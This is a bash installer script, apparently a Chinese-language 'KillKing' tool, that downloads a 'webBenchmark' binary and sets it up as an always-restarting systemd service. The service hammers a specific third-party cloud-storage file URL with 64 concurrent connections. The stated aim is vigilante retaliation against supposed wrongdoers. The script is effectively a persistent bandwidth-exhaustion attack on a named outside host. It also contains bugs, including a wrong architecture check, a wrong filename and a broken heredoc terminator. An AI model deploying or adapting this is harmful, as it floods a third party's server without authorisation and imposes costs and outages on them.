#!/bin/bash

# KillKing - always fight against who works for illegal things
# Runs on: Debian based, RHEL based
# Written by: York Zhao
# Thanks: Misaka No, fscarmen
# License: GAPL
# 全局变量
ver="1.0.1"
changeLog="增加菜单"
arch=$(uname -m)
virt=$(systemd-detect-virt)
kernelVer=$(uname -r)
TUN=$(cat /dev/net/tun 2>&1 | tr '[:upper:]' '[:lower:]')
REGEX=("debian" "ubuntu" "centos|red hat|kernel|oracle linux|alma|rocky" "'amazon linux'" "alpine")
RELEASE=("Debian" "Ubuntu" "CentOS" "CentOS" "Alpine")
PACKAGE_UPDATE=("apt -y update" "apt -y update" "yum -y update" "yum -y update" "apk update -f")
PACKAGE_INSTALL=("apt -y install" "apt -y install" "yum -y install" "yum -y install" "apk add -f")
CMD=("$(grep -i pretty_name /etc/os-release 2>/dev/null | cut -d \" -f2)" "$(hostnamectl 2>/dev/null | grep -i system | cut -d : -f2)" "$(lsb_release -sd 2>/dev/null)" "$(grep -i description /etc/lsb-release 2>/dev/null | cut -d \" -f2)" "$(grep . /etc/redhat-release 2>/dev/null)" "$(grep . /etc/issue 2>/dev/null | cut -d \\ -f1 | sed '/^[ ]*$/d')")


# 控制台字体
green() {
	echo -e "\033[32m\033[01m$1\033[0m"
}

red() {
	echo -e "\033[31m\033[01m$1\033[0m"
}

yellow() {
	echo -e "\033[33m\033[01m$1\033[0m"
}

# 必须以root运行脚本
[[ $(id -u) != 0 ]] && red "请使用“sudo -i”登录root用户后执行剑皇脚本！！！" && exit 1

# 获取IP地址及其信息
IP4=$(curl -s4m8 https://ip.gs/json)
IP6=$(curl -s6m8 https://ip.gs/json)
WAN4=$(expr "$IP4" : '.*ip\":\"\([^"]*\).*')
WAN6=$(expr "$IP6" : '.*ip\":\"\([^"]*\).*')

# 判断IP地址状态。出于剑皇总是有IPv4因此没有IPv4自动退出
IP4="$WAN4 （$COUNTRY4 $ASNORG4）"
IP6="$WAN6 （$COUNTRY6 $ASNORG6）"
if [ -z $WAN4 ]; then
	IP4="当前VPS未检测到IPv4地址"
    exit 1
fi

success_depend() {
    green "剑皇依赖安装成功"
}

depend_arch() {
    if [ $arch = "x86_64" ]; then
            wget https://cdn.jsdelivr.net/gh/maintell/webBenchmark@releases/download/0.6/webBenchmark_linux_x64
            chmod +x webBenchmark_linux_x64
            mv webBenchmark_linux_x64 /var/webBenchmark_linux_x64
    elif [ $arch = "arch64" ]; then
            wget https://cdn.jsdelivr.net/gh/maintell/webBenchmark@releases/download/0.6/webBenchmark_linux_arm
            chmod +x webBenchmark_linux_arm
            mv webBenchmark_linux_x64 /var/webBenchmark_linux_x64
    fi
}

# 定义安装剑皇依赖函数
install() {
	if [ $SYSTEM = "CentOS" ]; then
		yum install wget curl -y
		depend_arch
        green "剑皇依赖安装成功"
        success_depend
	elif [ $SYSTEM = "Alpine" ]; then
		apk add wget curl -y
        depend_arch
        success_depend
    elif [ $SYSTEM = "Debian" ]; then
        apt update
        apt install curl wget -y
        depend_arch
        success_depend
	fi
}

Service_config() {
       cat << TEXT > /etc/systemd/system/killking.service
       [Unit]
       Description=Killking utility daemon
       After=network.target

       [Install]
        WantedBy=multi-user.target

       [Service]
        Type=simple
        WorkingDirectory=/var
        ExecStart=./webBenchmark_linux_x64 -c 64 -s http://dong-down.oss-cn-beijing.aliyuncs.com/sdapp/606/xiaoshuo.apk
        Restart=always
        TEXT
        green "服务安装完成"
}

Service_start() {
       systemctl start killking
       
}

Service_stop() {
       systemctl stop killking
}

Service_restart() {
       systemctl restart killking
}

# 菜单
menu() {
	clear
	red "=================================="
	echo "                           "
	red "       KillKing box        "
	red "          by 小御坂的破站           "
	echo "                           "
	red "  Site: https://owo.misaka.rest  "
	echo "                           "
	red "=================================="
	echo "                            "
	green "当前脚本版本：v$ver"
	green "更新日志：$changeLog"
	echo "                            "
	red "检测到VPS信息如下："
	yellow "处理器架构：$arch"
	yellow "虚拟化架构：$virt"
	yellow "操作系统：$CMD"
	yellow "内核版本：$kernelVer"
	yellow "公网IPv4地址：$IP4"
	yellow "公网IPv6地址：$IP6"
	echo "                            "
	green "请选择对应的选项后进入到相对应的操作中"
	echo "                            "
	echo "1. 安装依赖"
    red "=================================="
	echo "2. 安装服务"
	echo "3. 开启服务"
	echo "4. 关闭服务"
	echo "5. 重启服务"
	echo "                            "
	echo "0. 退出脚本"
	echo "                            "
	read -p "请输入选项:" menuNumberInput
	case "$menuNumberInput" in
		1) install ;;
		2) Service_config ;;
		3) Service_start ;;
		4) Service_stop ;;
		5) Service_restart ;;
		0) exit 0 ;;
	esac
}

menu